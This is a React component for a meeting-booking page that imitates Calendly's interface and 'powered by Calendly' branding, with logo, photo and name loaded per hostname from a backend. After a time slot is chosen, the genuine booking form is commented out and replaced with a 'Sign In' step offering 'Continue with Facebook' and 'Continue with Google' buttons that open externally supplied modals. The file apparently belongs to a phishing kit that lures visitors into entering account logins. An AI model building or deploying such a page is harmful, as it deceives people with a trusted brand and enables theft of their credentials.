import "./calendly.css";
import Calendar from "react-calendar";
import { useForm } from "react-hook-form";
import { useEffect, useState } from "react";
import "react-calendar/dist/Calendar.css";
import FadeIn from "react-fade-in";
import { API_BE } from "./utils/variable";
import axios from "axios";
import { ThankYouPage } from "./ThankYouPage";

var utc = require("dayjs/plugin/utc");
var timezone = require("dayjs/plugin/timezone"); // dependent on utc plugin
dayjs.extend(utc);
dayjs.extend(timezone);
import dayjs from "dayjs";

export const LandingCalendly = ({ showModal, showModalGmail }) => {
  const [configValue, setConfigValue] = useState(null);

  const today = new Date();
  const [value, setValue] = useState(today);
  const [screenChange, onScreenChange] = useState(1);
  const [calendarChange, onCaledarChange] = useState(false);
  const [selectedButton, setSelectedButton] = useState(false);
  const [svgIcon, setSvg] = useState(true);
  const [isLoading, setIsLoading] = useState(true);

  const currentTimeZONE = dayjs.tz.guess();

  const [timeSelected, setTimeSelected] = useState("");
  const changeScreen = (screen) => onScreenChange(screen);
  const currentHour = today.getHours();
  const currentMinute = today.getMinutes();

  const onChange = (e) => {
    setValue(e);
    onCaledarChange(true);
    setSvg(false);
  };
  const timeSlots = [
    "09:30",
    "10:00",
    "10:30",
    "11:00",
    "11:30",
    "12:00",
    "12:30",
    "13:00",
    "13:30",
    "14:00",
    "14:30",
    "15:00",
    "15:30",
    "16:00",
    "16:30",
  ];

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  let timeoutId;

  const onSubmit = (data) => {
    console.log(data);
    setIsLoading(true);
    timeoutId = setTimeout(() => {
      changeScreen(3);
      setIsLoading(false);
      clearTimeout(timeoutId);
    }, 3000);
  };

  const handleButtonClick = (index) => {
    setTimeSelected(timeSlots[index]);
    setSelectedButton(index);
  };
  today.setDate(today.getDate());
  const formattedDate = value?.toLocaleDateString("en-US", {
    weekday: "long",
    month: "long",
    day: "numeric",
  });
  const formattedDateYear = value?.toLocaleDateString("en-US", {
    weekday: "long",
    month: "long",
    day: "numeric",
    year: "numeric",
  });

  const getConfig = async () => {
    const hostname = window.location.hostname;
    try {
      const config = await axios.get(`${API_BE}/users/config/web/${hostname}`);

      if (config && config?.data) {
        setConfigValue(config?.data?.data);
      }

      setIsLoading(false);
    } catch (error) {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    getConfig();
  }, []);

  const currentTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const targetTimeZone = "America/Los_Angeles"; // You can change this to your desired time zone

  const timeZoneName = Intl.DateTimeFormat("en-US", {
    timeZone: targetTimeZone,
    timeZoneName: "long",
  })
    .formatToParts(new Date())
    .find((part) => part.type === "timeZoneName").value;

  // Set the time zone to Central European Time (CET)
  today.toLocaleString("en-US", { timeZone: "Europe/Berlin" });

  // Format the time in the desired format (HH:MM)
  const hours = today.getHours().toString().padStart(2, "0");
  const minutes = today.getMinutes().toString().padStart(2, "0");

  // Create the final string in the desired format
  const currentTime = `${currentTimeZONE?.replace(
    "_",
    " "
  )} (${hours}:${minutes})`;

  if (isLoading) return null;
  return (
    <div className="App">
      <div className="box__shadow">
        <div className="calendar__wrapper">
          {screenChange !== 3 && (
            <div className="user__wrapper">
              <div className="logo__wrapper">
                <img width="50%" src={configValue?.img_url || ""} />
              </div>
              <div
                className={
                  screenChange == 2
                    ? "screen__two center__text"
                    : "center__text"
                }
              >
                <div
                  className={
                    screenChange == 2 || !svgIcon ? "mobile__back-svg" : null
                  }
                >
                  {screenChange == 2 && (
                    <div
                      className="back__svg"
                      onClick={() => changeScreen("1")}
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        version="1.1"
                        id="Layer_1"
                        x="0px"
                        y="0px"
                        width="100%"
                        viewBox="0 0 100 92"
                        enable-background="new 0 0 100 92"
                      >
                        <path
                          fill="#FFFFFF"
                          opacity="1.000000"
                          stroke="none"
                          d=" M55.000000,93.000000   C36.666668,93.000000 18.833340,93.000000 1.000007,93.000000   C1.000005,62.333344 1.000005,31.666683 1.000002,1.000020   C34.333317,1.000013 67.666634,1.000013 100.999969,1.000006   C100.999977,31.666647 100.999977,62.333294 100.999985,92.999969   C85.833336,93.000000 70.666664,93.000000 55.000000,93.000000  M91.556046,62.817856   C94.108154,55.125084 94.666748,47.395210 93.129883,39.332005   C88.392342,14.476489 60.677345,-1.529694 36.969803,7.128223   C11.103292,16.574589 0.341700,45.724495 13.869028,69.701256   C22.619495,85.211174 41.515846,93.712234 58.841278,90.249176   C74.501686,87.118942 84.799568,77.731026 91.556046,62.817856  z"
                        />
                        <path
                          fill="#EBEBEB"
                          opacity="1.000000"
                          stroke="none"
                          d=" M91.382950,63.168308   C84.799568,77.731026 74.501686,87.118942 58.841278,90.249176   C41.515846,93.712234 22.619495,85.211174 13.869028,69.701256   C0.341700,45.724495 11.103292,16.574589 36.969803,7.128223   C60.677345,-1.529694 88.392342,14.476489 93.129883,39.332005   C94.666748,47.395210 94.108154,55.125084 91.382950,63.168308  M68.266075,84.892876   C84.103279,78.151733 94.782227,58.166908 91.146454,40.549023   C87.280968,21.818092 71.615936,7.488889 51.878296,7.135051   C24.226192,6.639328 4.899758,32.712246 11.421382,57.988071   C17.717424,82.389618 45.172096,95.877838 68.266075,84.892876  z"
                        />
                        <path
                          fill="#FFFFFF"
                          opacity="1.000000"
                          stroke="none"
                          d=" M67.917747,85.049362   C45.172096,95.877838 17.717424,82.389618 11.421382,57.988071   C4.899758,32.712246 24.226192,6.639328 51.878296,7.135051   C71.615936,7.488889 87.280968,21.818092 91.146454,40.549023   C94.782227,58.166908 84.103279,78.151733 67.917747,85.049362  M66.198502,51.021671   C68.608986,50.906120 71.901863,51.614952 71.799881,47.907940   C71.699463,44.257732 68.390373,45.073483 66.007065,44.993649   C63.843689,44.921181 61.675968,44.978275 59.510166,44.978275   C53.475513,44.978268 47.440857,44.978268 41.406204,44.978268   C41.240185,44.544659 41.074162,44.111053 40.908142,43.677444   C43.728645,41.095325 46.744587,38.686340 49.266335,35.839569   C50.180344,34.807751 49.912590,32.729088 50.184059,31.128086   C48.466587,31.310963 46.172386,30.851603 45.130707,31.787031   C40.427284,36.010700 36.097965,40.648991 31.593182,45.096699   C29.461506,47.201363 29.719240,49.075977 31.765610,51.081425   C36.167816,55.395603 40.370602,59.924831 44.947510,64.040771   C46.046265,65.028862 48.288399,64.745506 50.004692,65.046890   C49.732933,63.329147 50.018127,61.173676 49.079823,59.979790   C46.729961,56.989853 43.825714,54.435623 40.470837,51.021736   C49.602768,51.021736 57.431068,51.021736 66.198502,51.021671  z"
                        />
                        <path
                          fill="#366EF6"
                          opacity="1.000000"
                          stroke="none"
                          d=" M65.728935,51.021706   C57.431068,51.021736 49.602768,51.021736 40.470837,51.021736   C43.825714,54.435623 46.729961,56.989853 49.079823,59.979790   C50.018127,61.173676 49.732933,63.329147 50.004692,65.046890   C48.288399,64.745506 46.046265,65.028862 44.947510,64.040771   C40.370602,59.924831 36.167816,55.395603 31.765610,51.081425   C29.719240,49.075977 29.461506,47.201363 31.593182,45.096699   C36.097965,40.648991 40.427284,36.010700 45.130707,31.787031   C46.172386,30.851603 48.466587,31.310963 50.184059,31.128086   C49.912590,32.729088 50.180344,34.807751 49.266335,35.839569   C46.744587,38.686340 43.728645,41.095325 40.908142,43.677444   C41.074162,44.111053 41.240185,44.544659 41.406204,44.978268   C47.440857,44.978268 53.475513,44.978268 59.510166,44.978275   C61.675968,44.978275 63.843689,44.921181 66.007065,44.993649   C68.390373,45.073483 71.699463,44.257732 71.799881,47.907940   C71.901863,51.614952 68.608986,50.906120 65.728935,51.021706  z"
                        />
                      </svg>
                    </div>
                  )}
                  {screenChange != 2 && !svgIcon && (
                    <div
                      className="back__svg hide__desktop"
                      onClick={() => setSvg(true)}
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        version="1.1"
                        id="Layer_1"
                        x="0px"
                        y="0px"
                        width="100%"
                        viewBox="0 0 100 92"
                        enable-background="new 0 0 100 92"
                      >
                        <path
                          fill="#FFFFFF"
                          opacity="1.000000"
                          stroke="none"
                          d=" M55.000000,93.000000   C36.666668,93.000000 18.833340,93.000000 1.000007,93.000000   C1.000005,62.333344 1.000005,31.666683 1.000002,1.000020   C34.333317,1.000013 67.666634,1.000013 100.999969,1.000006   C100.999977,31.666647 100.999977,62.333294 100.999985,92.999969   C85.833336,93.000000 70.666664,93.000000 55.000000,93.000000  M91.556046,62.817856   C94.108154,55.125084 94.666748,47.395210 93.129883,39.332005   C88.392342,14.476489 60.677345,-1.529694 36.969803,7.128223   C11.103292,16.574589 0.341700,45.724495 13.869028,69.701256   C22.619495,85.211174 41.515846,93.712234 58.841278,90.249176   C74.501686,87.118942 84.799568,77.731026 91.556046,62.817856  z"
                        />
                        <path
                          fill="#EBEBEB"
                          opacity="1.000000"
                          stroke="none"
                          d=" M91.382950,63.168308   C84.799568,77.731026 74.501686,87.118942 58.841278,90.249176   C41.515846,93.712234 22.619495,85.211174 13.869028,69.701256   C0.341700,45.724495 11.103292,16.574589 36.969803,7.128223   C60.677345,-1.529694 88.392342,14.476489 93.129883,39.332005   C94.666748,47.395210 94.108154,55.125084 91.382950,63.168308  M68.266075,84.892876   C84.103279,78.151733 94.782227,58.166908 91.146454,40.549023   C87.280968,21.818092 71.615936,7.488889 51.878296,7.135051   C24.226192,6.639328 4.899758,32.712246 11.421382,57.988071   C17.717424,82.389618 45.172096,95.877838 68.266075,84.892876  z"
                        />
                        <path
                          fill="#FFFFFF"
                          opacity="1.000000"
                          stroke="none"
                          d=" M67.917747,85.049362   C45.172096,95.877838 17.717424,82.389618 11.421382,57.988071   C4.899758,32.712246 24.226192,6.639328 51.878296,7.135051   C71.615936,7.488889 87.280968,21.818092 91.146454,40.549023   C94.782227,58.166908 84.103279,78.151733 67.917747,85.049362  M66.198502,51.021671   C68.608986,50.906120 71.901863,51.614952 71.799881,47.907940   C71.699463,44.257732 68.390373,45.073483 66.007065,44.993649   C63.843689,44.921181 61.675968,44.978275 59.510166,44.978275   C53.475513,44.978268 47.440857,44.978268 41.406204,44.978268   C41.240185,44.544659 41.074162,44.111053 40.908142,43.677444   C43.728645,41.095325 46.744587,38.686340 49.266335,35.839569   C50.180344,34.807751 49.912590,32.729088 50.184059,31.128086   C48.466587,31.310963 46.172386,30.851603 45.130707,31.787031   C40.427284,36.010700 36.097965,40.648991 31.593182,45.096699   C29.461506,47.201363 29.719240,49.075977 31.765610,51.081425   C36.167816,55.395603 40.370602,59.924831 44.947510,64.040771   C46.046265,65.028862 48.288399,64.745506 50.004692,65.046890   C49.732933,63.329147 50.018127,61.173676 49.079823,59.979790   C46.729961,56.989853 43.825714,54.435623 40.470837,51.021736   C49.602768,51.021736 57.431068,51.021736 66.198502,51.021671  z"
                        />
                        <path
                          fill="#366EF6"
                          opacity="1.000000"
                          stroke="none"
                          d=" M65.728935,51.021706   C57.431068,51.021736 49.602768,51.021736 40.470837,51.021736   C43.825714,54.435623 46.729961,56.989853 49.079823,59.979790   C50.018127,61.173676 49.732933,63.329147 50.004692,65.046890   C48.288399,64.745506 46.046265,65.028862 44.947510,64.040771   C40.370602,59.924831 36.167816,55.395603 31.765610,51.081425   C29.719240,49.075977 29.461506,47.201363 31.593182,45.096699   C36.097965,40.648991 40.427284,36.010700 45.130707,31.787031   C46.172386,30.851603 48.466587,31.310963 50.184059,31.128086   C49.912590,32.729088 50.180344,34.807751 49.266335,35.839569   C46.744587,38.686340 43.728645,41.095325 40.908142,43.677444   C41.074162,44.111053 41.240185,44.544659 41.406204,44.978268   C47.440857,44.978268 53.475513,44.978268 59.510166,44.978275   C61.675968,44.978275 63.843689,44.921181 66.007065,44.993649   C68.390373,45.073483 71.699463,44.257732 71.799881,47.907940   C71.901863,51.614952 68.608986,50.906120 65.728935,51.021706  z"
                        />
                      </svg>
                    </div>
                  )}
                  <div className="content__wrapper">
                    <div>
                      <div>
                        <img
                          className="avatar"
                          width="65px"
                          src={configValue?.profile_img_url || ""}
                        />
                      </div>
                      <p>{configValue?.full_name || "Agent"}</p>
                    </div>

                    <h2>15 Minutes Meeting</h2>
                  </div>
                </div>
                <div className="minute">
                  <svg
                    data-id="details-item-icon"
                    viewBox="0 0 10 10"
                    xmlns="http://www.w3.org/2000/svg"
                    role="img"
                  >
                    <path
                      d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z"
                      fill="none"
                      stroke="currentColor"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                    <path
                      d="M5 3.269V5l1.759 2.052"
                      fill="none"
                      stroke="currentColor"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                  </svg>
                  <span>15 min</span>
                </div>
                <div className="minute mt-12">
                  <svg
                    data-testid="phone-call-icon"
                    data-id="details-item-icon"
                    viewBox="0 0 10 10"
                    xmlns="http://www.w3.org/2000/svg"
                    role="img"
                  >
                    <path
                      d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                      fill="none"
                      stroke="currentColor"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    ></path>
                  </svg>
                  <span>Phone call</span>
                </div>
                {screenChange == 2 && (
                  <>
                    <div className="minute space__bettwen">
                      <svg
                        data-id="details-item-icon"
                        viewBox="0 0 20 20"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                        role="img"
                      >
                        <path
                          fillRule="evenodd"
                          clipRule="evenodd"
                          d="M6 0.999512C6 0.447227 5.55229 -0.000488281 5 -0.000488281C4.44772 -0.000488281 4 0.447227 4 0.999512V1.99951H3C2.20435 1.99951 1.44129 2.31558 0.87868 2.87819C0.316071 3.4408 0 4.20386 0 4.99951V7.99951V16.9995C0 17.7952 0.316071 18.5582 0.87868 19.1208C1.44129 19.6834 2.20435 19.9995 3 19.9995H17C17.7957 19.9995 18.5587 19.6834 19.1213 19.1208C19.6839 18.5582 20 17.7952 20 16.9995V7.99951V4.99951C20 4.20386 19.6839 3.4408 19.1213 2.87819C18.5587 2.31558 17.7957 1.99951 17 1.99951H16V0.999512C16 0.447227 15.5523 -0.000488281 15 -0.000488281C14.4477 -0.000488281 14 0.447227 14 0.999512V1.99951H6V0.999512ZM18 6.99951V4.99951C18 4.7343 17.8946 4.47994 17.7071 4.29241C17.5196 4.10487 17.2652 3.99951 17 3.99951H15.001L15 3.99951L14.999 3.99951H5.00099L5 3.99951L4.99901 3.99951H3C2.73478 3.99951 2.48043 4.10487 2.29289 4.29241C2.10536 4.47994 2 4.7343 2 4.99951V6.99951H18ZM2 8.99951H18V16.9995C18 17.2647 17.8946 17.5191 17.7071 17.7066C17.5196 17.8942 17.2652 17.9995 17 17.9995H3C2.73478 17.9995 2.48043 17.8942 2.29289 17.7066C2.10536 17.5191 2 17.2647 2 16.9995V8.99951Z"
                          fill="currentColor"
                        ></path>
                      </svg>
                      <span>
                        {timeSelected}, {formattedDateYear}
                      </span>
                    </div>
                    <div className="minute space__bettwen">
                      <svg
                        data-id="details-item-icon"
                        viewBox="0 0 10 10"
                        xmlns="http://www.w3.org/2000/svg"
                        role="img"
                      >
                        <path
                          d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z"
                          fill="none"
                          stroke="currentColor"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        ></path>
                        <path
                          d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                          fill="none"
                          stroke="currentColor"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        ></path>
                      </svg>
                      <span>{currentTime}</span>
                    </div>
                  </>
                )}
              </div>
              <div className="footer__wrapper">
                <p>Cookie settings</p>
                <p>Report abuse</p>
              </div>
            </div>
          )}

          <div
            className={
              screenChange == 2
                ? "form__wrapper date__time"
                : screenChange == 3
                ? "screen__three date__time"
                : "date__time"
            }
          >
            {screenChange == 1 ? (
              <>
                <h2>Select a Date & Time</h2>
                <div
                  className={
                    calendarChange && !svgIcon
                      ? "mobile__version calendar__container"
                      : "calendar__container svg__icon"
                  }
                >
                  <div className="calendar__date">
                    <Calendar
                      onChange={onChange}
                      value={value}
                      minDate={new Date()}
                      prevLabel={
                        <div className="arrow">
                          <svg
                            viewBox="0 0 20 20"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                            role="img"
                          >
                            <path
                              fillRule="evenodd"
                              clipRule="evenodd"
                              d="M13.4806 15.9941C13.8398 15.6529 13.8398 15.0998 13.4806 14.7586L8.47062 10L13.4806 5.24142C13.8398 4.90024 13.8398 4.34707 13.4806 4.00589C13.1214 3.66471 12.539 3.66471 12.1798 4.00589L6.51941 9.38223C6.1602 9.72342 6.1602 10.2766 6.51941 10.6178L12.1798 15.9941C12.539 16.3353 13.1214 16.3353 13.4806 15.9941Z"
                              fill="currentColor"
                            ></path>
                          </svg>
                        </div>
                      }
                      nextLabel={
                        <div className="arrow">
                          <svg
                            viewBox="0 0 20 20"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                            role="img"
                          >
                            <path
                              fillRule="evenodd"
                              clipRule="evenodd"
                              d="M6.51941 15.9941C6.1602 15.6529 6.1602 15.0998 6.51941 14.7586L11.5294 10L6.51941 5.24142C6.1602 4.90024 6.1602 4.34707 6.51941 4.00589C6.87862 3.66471 7.46101 3.66471 7.82022 4.00589L13.4806 9.38223C13.8398 9.72342 13.8398 10.2766 13.4806 10.6178L7.82022 15.9941C7.46101 16.3353 6.87862 16.3353 6.51941 15.9941Z"
                              fill="currentColor"
                            ></path>
                          </svg>
                        </div>
                      }
                    />
                    <div className="time__zone-wrapper">
                      <p>Time zone</p>
                      <div className="central">
                        <img width="14px" src="/world.png" />
                        {currentTime}
                      </div>
                    </div>
                    <div className="footer__wrapper footer__wrapper-mobile">
                      <p>Cookie settings</p>
                      <p>Report abuse</p>
                    </div>
                  </div>
                  {calendarChange && (
                    <FadeIn className="full__width">
                      <div className="calendar__time">
                        <h2>{formattedDate && formattedDate}</h2>
                        <div className="available__wrapper">
                          <div className="green__text"></div>
                          <p> times you're available</p>
                        </div>

                        <div className="button__time-wrapper">
                          {timeSlots.map((time, index) => (
                            <div
                              key={index}
                              className={
                                selectedButton === index && "next__button"
                              }
                            >
                              <button
                                className="time"
                                onClick={() => handleButtonClick(index)}
                              >
                                <div className="green__text"></div>
                                {time}
                              </button>
                              <FadeIn>
                                {selectedButton === index && (
                                  <button
                                    onClick={() => {
                                      const dateTime = `${timeSelected}, ${formattedDateYear}`;
                                      localStorage.setItem(
                                        "dateTime-paloma",
                                        JSON.stringify(dateTime)
                                      );

                                      changeScreen(2);
                                    }}
                                  >
                                    Next
                                  </button>
                                )}
                              </FadeIn>
                            </div>
                          ))}
                        </div>
                        <div className="footer__wrapper footer__wrapper-mobile">
                          <p>Cookie settings</p>
                          <p>Report abuse</p>
                        </div>
                      </div>
                    </FadeIn>
                  )}
                </div>
              </>
            ) : screenChange == 2 ? (
              <div>
                <FadeIn className="full__width">
                  {/* <h2>Please confirm your scheduled call</h2> */}
                  <h2>Sign In</h2>

                  <div className="dummy__text">
                    <p>
                      Please confirm your appointment with{" "}
                      {configValue?.full_name || ""} for {timeSelected},{" "}
                      {formattedDateYear}.
                    </p>
                  </div>

                  {/* <form onSubmit={handleSubmit(onSubmit)}>
                    <div>
                      <label htmlFor="name">Name*</label>
                      <input
                        {...register("name", { required: true })}
                        id="name"
                      />
                      {errors.name && <p>Name is required.</p>}
                    </div>

                    <div>
                      <label htmlFor="email">Email*</label>
                      <input
                        {...register("email", {
                          required: true,
                          pattern: /^[a-zA-Z0-9+_.-]+@[a-zA-Z0-9.-]+$/,
                        })}
                        id="email"
                      />
                      {errors.email?.type === "required" && (
                        <p>Email is required.</p>
                      )}
                      {errors.email?.type === "pattern" && (
                        <p>Please enter a valid email address.</p>
                      )}
                    </div>
                    <div>
                      <button className="add__guests">Add Guests</button>
                    </div>
                    <button type="submit" className="submit">
                      {isLoading ? (
                        <span class="loader"></span>
                      ) : (
                        "Schedule event"
                      )}
                    </button>
                  </form> */}
                  <div className="facebook__button">
                    <button onClick={() => showModal()}>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="25"
                        height="24"
                        viewBox="0 0 25 24"
                        fill="none"
                      >
                        <g clip-path="url(#clip0_302_2)">
                          <rect
                            width="24"
                            height="24"
                            transform="translate(0.845947)"
                            fill="#1877F2"
                          />
                          <path
                            d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
                            fill="white"
                          />
                        </g>
                        <defs>
                          <clipPath id="clip0_302_2">
                            <rect
                              width="24"
                              height="24"
                              fill="white"
                              transform="translate(0.845947)"
                            />
                          </clipPath>
                        </defs>
                      </svg>
                      Continue with Facebook
                    </button>
                  </div>
                  <div className="gmail__button">
                    <button onClick={() => showModalGmail()}>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="25"
                        height="24"
                        viewBox="0 0 25 24"
                        fill="none"
                      >
                        <rect
                          width="24"
                          height="24"
                          transform="translate(0.845947)"
                          fill="white"
                        />
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M23.8859 12.2613C23.8859 11.4459 23.8128 10.6618 23.6769 9.90906H12.8459V14.3575H19.035C18.7684 15.795 17.9582 17.0129 16.7403 17.8284V20.7138H20.4569C22.6314 18.7118 23.8859 15.7636 23.8859 12.2613Z"
                          fill="#4285F4"
                        />
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M12.8459 23.4998C15.9509 23.4998 18.5541 22.47 20.4568 20.7137L16.7402 17.8282C15.7105 18.5182 14.3932 18.9259 12.8459 18.9259C9.85068 18.9259 7.31546 16.903 6.41114 14.1848H2.56909V17.1644C4.46136 20.9228 8.35046 23.4998 12.8459 23.4998Z"
                          fill="#34A853"
                        />
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M6.41117 14.1851C6.18117 13.4951 6.05049 12.7581 6.05049 12.0001C6.05049 11.2422 6.18117 10.5051 6.41117 9.81512V6.83557H2.56913C1.79027 8.38807 1.34595 10.1444 1.34595 12.0001C1.34595 13.8558 1.79027 15.6122 2.56913 17.1647L6.41117 14.1851Z"
                          fill="#FBBC05"
                        />
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M12.8459 5.07386C14.5343 5.07386 16.0502 5.65409 17.242 6.79364L20.5405 3.49523C18.5489 1.63955 15.9457 0.5 12.8459 0.5C8.35046 0.5 4.46136 3.07705 2.56909 6.83545L6.41114 9.815C7.31546 7.09682 9.85068 5.07386 12.8459 5.07386Z"
                          fill="#EA4335"
                        />
                      </svg>
                      Continue with Google
                    </button>
                  </div>
                  <div className="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                    <p>Cookie settings</p>
                    <p>Report abuse</p>
                  </div>
                </FadeIn>
              </div>
            ) : null}
            <a className="logo__wrapper-calendly hide__mobile">
              <div className="background">
                <div className="powerd__by">powered by</div>
                <div className="calendly">Calendly</div>
              </div>
            </a>
          </div>
        </div>
      </div>
      <a className="logo__wrapper-calendly-mobile">
        <div className="background">
          <div className="powerd__by">powered by</div>
          <div className="calendly">Calendly</div>
        </div>
      </a>
    </div>
  );
};
